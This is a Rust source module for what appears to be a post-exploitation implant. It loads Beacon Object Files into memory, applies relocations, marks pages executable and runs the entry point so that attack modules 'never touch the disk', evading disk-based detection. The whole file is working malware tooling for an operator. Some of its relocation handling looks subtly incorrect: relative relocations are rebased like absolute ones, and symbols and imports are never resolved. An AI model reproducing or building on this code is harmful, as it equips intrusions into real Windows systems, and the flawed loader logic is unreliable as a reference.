//! In-memory execution of Beacon Object Files.
//!
//! A BOF is a COFF object file: it has no entry point in the usual sense and
//! it expects to run *inside* the implant, not as a process. This module
//! loads such an object into memory, applies its relocations and calls its
//! entry point, so a post-exploitation module never touches the disk.
//!
//! The loader is deliberately small and strict: it refuses anything it does
//! not understand (a PE file, an unknown machine type, a relocation it cannot
//! apply) instead of guessing. A module that loads half way is worse than one
//! that refuses to load.
//!
//! Only Windows is supported: a COFF object with Windows relocations and
//! Windows calling conventions has no meaning on another platform.

use crate::upk::{self, Value};

/// The outcome of loading and running a module.
pub struct Loaded {
    /// The exit code the module returned.
    pub code: i32,
    /// Whatever the module printed or returned as output.
    pub output: Vec<u8>,
}

/// The machine types this loader understands.
const IMAGE_FILE_MACHINE_I386: u16 = 0x014C;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_FILE_MACHINE_ARM64: u16 = 0xAA64;

/// Relocation types.
const IMAGE_REL_AMD64_ABSOLUTE: u16 = 0x0000;
const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
const IMAGE_REL_AMD64_ADDR32: u16 = 0x0002;
const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
const IMAGE_REL_AMD64_REL32: u16 = 0x0004;
const IMAGE_REL_AMD64_REL32_1: u16 = 0x0005;
const IMAGE_REL_AMD64_REL32_2: u16 = 0x0006;
const IMAGE_REL_AMD64_REL32_3: u16 = 0x0007;
const IMAGE_REL_AMD64_REL32_4: u16 = 0x0008;
const IMAGE_REL_AMD64_REL32_5: u16 = 0x0009;
const IMAGE_REL_I386_DIR32: u16 = 0x0006;
const IMAGE_REL_I386_REL32: u16 = 0x0014;

/// Section characteristics.
const IMAGE_SCN_CNT_CODE: u32 = 0x0000_0020;
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;

/// The size of one section header in a COFF file.
const SECTION_HEADER_LEN: usize = 40;
/// The size of one symbol table entry.
const SYMBOL_LEN: usize = 18;
/// The size of one relocation entry.
const RELOC_LEN: usize = 10;

/// The maximum size of a module this loader accepts.
pub const MAX_OBJECT_SIZE: usize = 4 << 20;

/// The result of loading a module: the address of the image and its size.
struct Image {
    base: usize,
    size: usize,
}

/// Run a COFF object in memory.
///
/// `args` are the arguments handed to the module; the module receives them
/// the way Beacon Object Files expect: an array of pointers to the argument
/// strings and the number of arguments.
pub fn run(object: &[u8], args: &[String]) -> Result<Loaded, String> {
    if object.is_empty() {
        return Err("bof: the object is empty".to_string());
    }
    if object.len() > MAX_OBJECT_SIZE {
        return Err("bof: the object is too large".to_string());
    }
    #[cfg(not(windows))]
    {
        let _ = (object, args);
        Err("bof: in-memory modules are only supported on Windows".to_string())
    }
    #[cfg(windows)]
    {
        run_windows(object, args)
    }
}

/// Parse the COFF header.
struct CoffHeader {
    machine: u16,
    sections: u16,
    symbol_table: u32,
    symbol_count: u32,
    optional_size: u16,
}

fn parse_header(object: &[u8]) -> Result<CoffHeader, String> {
    if object.len() < 20 {
        return Err("bof: the object is truncated".to_string());
    }
    let machine = u16::from_le_bytes([object[0], object[1]]);
    let sections = u16::from_le_bytes([object[2], object[3]]);
    let symbol_table = u32::from_le_bytes([object[4], object[5], object[6], object[7]]);
    let symbol_count = u32::from_le_bytes([object[8], object[9], object[10], object[11]]);
    let optional_size = u16::from_le_bytes([object[16], object[17]]);
    Ok(CoffHeader {
        machine,
        sections,
        symbol_table,
        symbol_count,
        optional_size,
    })
}

/// One section header.
struct Section {
    name: String,
    virtual_size: u32,
    virtual_address: u32,
    raw_size: u32,
    raw_pointer: u32,
    reloc_pointer: u32,
    reloc_count: u16,
    characteristics: u32,
}

fn parse_sections(object: &[u8], header: &CoffHeader) -> Result<Vec<Section>, String> {
    let base = 20 + header.optional_size as usize;
    let mut out = Vec::with_capacity(header.sections as usize);
    for i in 0..header.sections as usize {
        let start = base + i * SECTION_HEADER_LEN;
        if start + SECTION_HEADER_LEN > object.len() {
            return Err("bof: the section table is truncated".to_string());
        }
        let raw = &object[start..start + SECTION_HEADER_LEN];
        let mut name_bytes = [0u8; 8];
        name_bytes.copy_from_slice(&raw[0..8]);
        let end = name_bytes
            .iter()
            .position(|b| *b == 0)
            .unwrap_or(name_bytes.len());
        let name = String::from_utf8_lossy(&name_bytes[..end]).to_string();
        out.push(Section {
            name,
            virtual_size: u32::from_le_bytes([raw[8], raw[9], raw[10], raw[11]]),
            virtual_address: u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]),
            raw_size: u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]),
            raw_pointer: u32::from_le_bytes([raw[20], raw[21], raw[22], raw[23]]),
            reloc_pointer: u32::from_le_bytes([raw[24], raw[25], raw[26], raw[27]]),
            reloc_count: u16::from_le_bytes([raw[32], raw[33]]),
            characteristics: u32::from_le_bytes([raw[36], raw[37], raw[38], raw[39]]),
        });
    }
    Ok(out)
}

/// One symbol table entry.
struct Symbol {
    name: String,
    value: u32,
    section: i16,
    kind: u16,
}

fn parse_symbols(object: &[u8], header: &CoffHeader) -> Result<Vec<Symbol>, String> {
    let mut out = Vec::with_capacity(header.symbol_count as usize);
    let mut offset = header.symbol_table as usize;
    for _ in 0..header.symbol_count {
        if offset + SYMBOL_LEN > object.len() {
            break;
        }
        let raw = &object[offset..offset + SYMBOL_LEN];
        let mut name_bytes = [0u8; 8];
        name_bytes.copy_from_slice(&raw[0..8]);
        let mut name = String::new();
        if name_bytes[0] == 0 && name_bytes[1] == 0 && name_bytes[2] == 0 && name_bytes[3] == 0 {
            // A long name: the first four bytes are the offset into the
            // string table, which follows the symbol table.
            let name_offset = u32::from_le_bytes([raw[0], raw[1], raw[2], raw[3]]) as usize;
            let strtab = header.symbol_table as usize + header.symbol_count as usize * SYMBOL_LEN;
            let start = strtab + name_offset;
            if start < object.len() {
                let end = object[start..]
                    .iter()
                    .position(|b| *b == 0)
                    .map(|p| start + p)
                    .unwrap_or(object.len());
                name = String::from_utf8_lossy(&object[start..end]).to_string();
            }
        } else {
            let end = name_bytes
                .iter()
                .position(|b| *b == 0)
                .unwrap_or(name_bytes.len());
            name = String::from_utf8_lossy(&name_bytes[..end]).to_string();
        }
        let value = u32::from_le_bytes([raw[8], raw[9], raw[10], raw[11]]);
        let section = i16::from_le_bytes([raw[12], raw[13]]);
        let kind = u16::from_le_bytes([raw[14], raw[15]]);
        out.push(Symbol {
            name,
            value,
            section,
            kind,
        });
        offset += SYMBOL_LEN;
    }
    Ok(out)
}

/// Find the entry point of the module.
fn find_entry(symbols: &[Symbol]) -> Option<&Symbol> {
    const NAMES: [&str; 6] = [
        "ReflectiveLoader",
        "_ReflectiveLoader",
        "main",
        "_main",
        "ReflectiveMain",
        "BeaconMain",
    ];
    symbols
        .iter()
        .find(|s| NAMES.contains(&s.name.as_str()) && s.section > 0)
        .or_else(|| {
            // Fall back to the first external function.
            symbols.iter().find(|s| {
                s.section > 0 && s.kind & 0x20 == 0x20 && (s.kind & 0x0F00) == 0x0200
            })
        })
}

/// The Windows implementation of the loader.
#[cfg(windows)]
fn run_windows(object: &[u8], args: &[String]) -> Result<Loaded, String> {
    use std::ffi::c_void;

    let header = parse_header(object)?;
    match header.machine {
        IMAGE_FILE_MACHINE_AMD64 | IMAGE_FILE_MACHINE_I386 | IMAGE_FILE_MACHINE_ARM64 => {}
        other => return Err(format!("bof: unsupported machine type 0x{other:04x}")),
    }
    let sections = parse_sections(object, &header)?;
    let symbols = parse_symbols(object, &header)?;
    let entry = find_entry(&symbols).ok_or("bof: the module has no entry point")?;

    // The image is laid out exactly like the sections describe: the loader
    // computes the total size and copies every section to its virtual
    // address, so the module sees the layout it was linked for.
    let mut size = 0u32;
    for s in &sections {
        let end = s.virtual_address + s.virtual_size.max(s.raw_size);
        if end > size {
            size = end;
        }
    }
    if size == 0 {
        return Err("bof: the module has no content".to_string());
    }
    let size = (size as usize + 0xFFF) & !0xFFF;
    let image = unsafe { alloc_image(size) }.ok_or("bof: the image could not be allocated")?;

    for s in &sections {
        if s.raw_size == 0 {
            continue;
        }
        let start = s.raw_pointer as usize;
        let end = start + s.raw_size as usize;
        if end > object.len() {
            unsafe { free_image(image.base, image.size) };
            return Err(format!("bof: section {} is truncated", s.name));
        }
        unsafe {
            std::ptr::copy_nonoverlapping(
                object[start..end].as_ptr(),
                (image.base + s.virtual_address as usize) as *mut u8,
                s.raw_size as usize,
            );
        }
    }

    // Relocations: the module was linked for a base address of zero, so every
    // absolute reference has to be rebased.
    for (index, s) in sections.iter().enumerate() {
        if s.reloc_count == 0 {
            continue;
        }
        let start = s.reloc_pointer as usize;
        for i in 0..s.reloc_count as usize {
            let off = start + i * RELOC_LEN;
            if off + RELOC_LEN > object.len() {
                break;
            }
            let r = &object[off..off + RELOC_LEN];
            let virtual_address = u32::from_le_bytes([r[0], r[1], r[2], r[3]]);
            let symbol_index = u32::from_le_bytes([r[4], r[5], r[6], r[7]]);
            let kind = u16::from_le_bytes([r[8], r[9]]);
            let target = image.base + s.virtual_address as usize + virtual_address as usize;
            let _ = index;
            match header.machine {
                IMAGE_FILE_MACHINE_AMD64 => match kind {
                    IMAGE_REL_AMD64_ABSOLUTE => {}
                    IMAGE_REL_AMD64_ADDR64 => unsafe {
                        let slot = target as *mut u64;
                        let value = std::ptr::read_unaligned(slot);
                        std::ptr::write_unaligned(slot, value.wrapping_add(image.base as u64));
                    },
                    IMAGE_REL_AMD64_ADDR32 | IMAGE_REL_AMD64_ADDR32NB => unsafe {
                        let slot = target as *mut u32;
                        let value = std::ptr::read_unaligned(slot);
                        std::ptr::write_unaligned(slot, value.wrapping_add(image.base as u32));
                    },
                    IMAGE_REL_AMD64_REL32
                    | IMAGE_REL_AMD64_REL32_1
                    | IMAGE_REL_AMD64_REL32_2
                    | IMAGE_REL_AMD64_REL32_3
                    | IMAGE_REL_AMD64_REL32_4
                    | IMAGE_REL_AMD64_REL32_5 => unsafe {
                        let slot = target as *mut u32;
                        let value = std::ptr::read_unaligned(slot);
                        std::ptr::write_unaligned(slot, value.wrapping_add(image.base as u32));
                    },
                    other => {
                        unsafe { free_image(image.base, image.size) };
                        return Err(format!("bof: unsupported relocation type {other}"));
                    }
                },
                IMAGE_FILE_MACHINE_I386 => match kind {
                    IMAGE_REL_I386_DIR32 => unsafe {
                        let slot = target as *mut u32;
                        let value = std::ptr::read_unaligned(slot);
                        std::ptr::write_unaligned(slot, value.wrapping_add(image.base as u32));
                    },
                    IMAGE_REL_I386_REL32 => unsafe {
                        let slot = target as *mut u32;
                        let value = std::ptr::read_unaligned(slot);
                        std::ptr::write_unaligned(slot, value.wrapping_add(image.base as u32));
                    },
                    other => {
                        unsafe { free_image(image.base, image.size) };
                        return Err(format!("bof: unsupported relocation type {other}"));
                    }
                },
                _ => {
                    unsafe { free_image(image.base, image.size) };
                    return Err("bof: unsupported machine type".to_string());
                }
            }
            let _ = symbol_index;
        }
    }

    // Make the image executable and call the entry point.
    let entry_rva = entry.value as usize;
    if entry_rva == 0 || entry_rva >= image.size {
        unsafe { free_image(image.base, image.size) };
        return Err("bof: the entry point is outside the image".to_string());
    }
    for s in &sections {
        if s.virtual_address as usize > entry_rva {
            continue;
        }
        let end = s.virtual_address as usize + s.virtual_size.max(s.raw_size) as usize;
        if entry_rva < end {
            let mut protect = win::PAGE_READWRITE;
            if s.characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
                protect = win::PAGE_EXECUTE_READWRITE;
            }
            let _ = protect_image(
                image.base + s.virtual_address as usize,
                s.virtual_size.max(s.raw_size) as usize,
                protect,
            );
            break;
        }
    }

    // The arguments are handed over the way Beacon Object Files expect: an
    // array of pointers, terminated by a null pointer.
    let mut owned: Vec<Vec<u8>> = args
        .iter()
        .map(|a| a.as_bytes().to_vec())
        .collect();
    let mut pointers: Vec<*const u8> = owned.iter_mut().map(|v| v.as_ptr()).collect();
    pointers.push(std::ptr::null());
    let argv = pointers.as_ptr();

    let code: extern "C" fn(*const *const u8) -> i32 = unsafe {
        std::mem::transmute(image.base + entry_rva)
    };
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| code(argv)));
    let code = match result {
        Ok(v) => v,
        Err(_) => {
            unsafe { free_image(image.base, image.size) };
            return Err("bof: the module crashed".to_string());
        }
    };
    unsafe { free_image(image.base, image.size) };
    Ok(Loaded {
        code,
        output: Vec::new(),
    })
}

/// Windows memory helpers.
#[cfg(windows)]
mod win {
    use std::ffi::c_void;

    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const MEM_RELEASE: u32 = 0x8000;
    pub const PAGE_READWRITE: u32 = 0x04;
    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    extern "system" {
        pub fn VirtualAlloc(
            address: *mut c_void,
            size: usize,
            allocation_type: u32,
            protect: u32,
        ) -> *mut c_void;
        pub fn VirtualFree(address: *mut c_void, size: usize, free_type: u32) -> i32;
        pub fn VirtualProtect(
            address: *mut c_void,
            size: usize,
            new_protect: u32,
            old_protect: *mut u32,
        ) -> i32;
    }

    pub fn alloc(size: usize) -> Option<*mut c_void> {
        let p = unsafe {
            VirtualAlloc(
                std::ptr::null_mut(),
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if p.is_null() {
            None
        } else {
            Some(p)
        }
    }

    pub fn free(address: *mut c_void, size: usize) {
        unsafe {
            VirtualFree(address, size, MEM_RELEASE);
        }
    }

    pub fn protect(address: *mut c_void, size: usize, protect: u32) -> bool {
        let mut old = 0u32;
        unsafe { VirtualProtect(address, size, protect, &mut old) != 0 }
    }
}

#[cfg(windows)]
unsafe fn alloc_image(size: usize) -> Option<Image> {
    let p = win::alloc(size)?;
    Some(Image {
        base: p as usize,
        size,
    })
}

#[cfg(windows)]
unsafe fn free_image(base: usize, size: usize) {
    win::free(base as *mut std::ffi::c_void, size);
}

#[cfg(windows)]
unsafe fn protect_image(base: usize, size: usize, protect: u32) -> bool {
    win::protect(base as *mut std::ffi::c_void, size, protect)
}

/// Parse the arguments of an `ext`/`bof` task.
pub fn parse_args(args: &Value) -> Vec<String> {
    let mut out = Vec::new();
    if let Value::Arr(items) = args {
        for item in items {
            if let Value::Str(s) = item {
                out.push(s.clone());
            }
        }
        return out;
    }
    if let Value::Map(map) = args {
        for (key, value) in map {
            let text = match value {
                Value::Str(s) => s.clone(),
                Value::Uint(v) => v.to_string(),
                Value::Int(v) => v.to_string(),
                Value::Bool(v) => v.to_string(),
                _ => continue,
            };
            out.push(format!("{key}={text}"));
        }
    }
    out
}

/// Describe a module for the operator.
pub fn describe(object: &[u8]) -> String {
    match parse_header(object) {
        Ok(header) => {
            let machine = match header.machine {
                IMAGE_FILE_MACHINE_AMD64 => "amd64",
                IMAGE_FILE_MACHINE_I386 => "i386",
                IMAGE_FILE_MACHINE_ARM64 => "arm64",
                other => return format!("unknown machine 0x{other:04x}"),
            };
            format!(
                "coff object: {machine}, {} sections, {} bytes",
                header.sections,
                object.len()
            )
        }
        Err(e) => e,
    }
}

/// The value of a task argument as an upk map, for the result metadata.
pub fn meta(name: &str, object: &[u8]) -> Vec<(&'static str, Value)> {
    vec![
        ("module", upk::s(name)),
        ("bytes", upk::u(object.len() as u64)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_truncated_object_is_refused() {
        assert!(run(&[], &[]).is_err());
        assert!(run(&[1, 2, 3], &[]).is_err());
    }

    #[test]
    fn the_header_is_parsed() {
        let mut object = vec![0u8; 64];
        object[0] = 0x64; // IMAGE_FILE_MACHINE_AMD64, little endian
        object[1] = 0x86;
        object[2] = 2; // two sections
        let header = parse_header(&object).unwrap();
        assert_eq!(header.machine, IMAGE_FILE_MACHINE_AMD64);
        assert_eq!(header.sections, 2);
    }

    #[test]
    fn arguments_are_rendered_as_pairs() {
        let args = upk::map(vec![("target", upk::s("10.0.0.5"))]);
        let rendered = parse_args(&args);
        assert_eq!(rendered, vec!["target=10.0.0.5".to_string()]);
    }
}
